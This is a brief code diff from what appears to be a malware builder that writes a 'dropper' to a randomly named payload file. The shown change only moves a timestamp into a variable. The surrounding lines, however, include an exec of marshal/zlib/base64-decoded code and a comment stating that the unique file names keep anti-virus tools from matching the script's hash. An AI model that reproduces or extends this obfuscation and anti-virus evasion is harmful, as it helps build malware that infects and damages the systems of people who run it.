@@ -156,7 +156,9 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         #this will prevent anti-viruses from looking for hashes of the script
         
         system = platform.system()
-        payload_file_name = f"payload_{os_name}_{arch}_{datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S.f%z")}_{uuid.uuid4()}"
+        date = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%S.f%z')
+        
+        payload_file_name = f"payload_{os_name}_{arch}_{date}_{uuid.uuid4()}"
 
         with open(f"{payload_file_name}.py", 'w') as f:
             f.writelines(dropper)
